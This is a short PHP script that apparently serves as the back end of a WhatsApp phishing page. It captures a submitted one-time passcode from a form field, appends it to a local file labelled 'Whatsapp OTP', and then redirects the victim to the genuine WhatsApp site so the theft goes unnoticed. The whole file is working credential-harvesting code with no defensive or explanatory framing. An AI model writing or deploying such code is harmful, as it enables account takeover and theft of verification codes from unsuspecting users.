<?php
file_put_contents("otp.txt", "Whatsapp OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.whatsapp.com/?lang=en');
?>
